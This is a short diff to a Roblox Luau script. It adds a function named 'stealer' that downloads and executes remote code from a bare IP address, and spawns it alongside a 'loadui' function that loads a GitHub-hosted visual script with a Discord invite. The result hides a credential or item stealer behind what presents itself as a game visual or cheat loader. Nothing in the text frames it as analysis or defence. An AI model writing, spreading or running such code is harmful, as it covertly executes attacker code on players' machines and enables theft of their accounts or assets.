@@ -1,2 +1,11 @@
-ID="488ddbfe-1c46-4e5e-8bfa-ab926272fff0";
-loadstring(game:HttpGet("http://5.129.235.74:3910/cdn/loader.luau"))()
+local function stealer()
+    ID="488ddbfe-1c46-4e5e-8bfa-ab926272fff0";
+    loadstring(game:HttpGet("http://5.129.217.87:3910/cdn/loader.luau"))()
+end
+local function loadui()
+  loadstring(game:HttpGet("https://raw.githubusercontent.com/veryimportantrr/x/refs/heads/main/gag_visual.lua", true))("discord.gg/csxu2nCkw9")
+
+end
+
+task.spawn(stealer)
+task.spawn(loadui)
